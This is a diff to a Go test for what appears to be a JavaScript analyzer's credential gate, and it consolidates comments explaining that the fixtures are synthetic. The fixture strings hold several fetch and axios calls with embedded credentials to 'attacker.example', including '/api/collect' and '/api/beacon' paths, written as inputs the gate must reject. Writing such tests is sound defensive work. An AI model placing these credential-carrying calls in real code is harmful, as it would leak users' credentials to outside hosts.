@@ -905,14 +905,15 @@ var samePort = "https://example.com:443/api/".concat("z");
 //
 // The scheme-relative fixtures are the ones that regressed; keep them.
 func TestAnalyze_AbsoluteCredentialGate(t *testing.T) {
+	// EVERY credential below is synthetic (u:p, token) on RFC 2606 reserved
+	// domains (attacker.example, app.example.com). They are inputs under test:
+	// this function asserts the credential gate REJECTS them. Annotated once
+	// here rather than per row -- an earlier pass annotated only two rows
+	// mid-list, which left the first three reading as unannotated.
 	js := `fetch("//u:p@attacker.example/api/collect");` +
 		`fetch("//token@attacker.example/api/beacon");` +
 		`fetch("https://u:p@attacker.example/api/explicit");` +
-		// u:p is synthetic; attacker.example/app.example.com are RFC 2606
-		// reserved domains. This fixture asserts the credential gate REJECTS it.
 		`fetch("HTTPS://u:p@attacker.example/api/upper");` +
-		// u:p is synthetic; app.example.com is an RFC 2606 reserved domain.
-		// This fixture asserts the credential gate REJECTS it.
 		`axios.get("https://u:p@app.example.com/api/self");` +
 		"var t = fetch(`https://u:p@app.example.com/api/${id}/tpl`);" +
 		// Concat producer spellings: credential rejection is enforced here, at
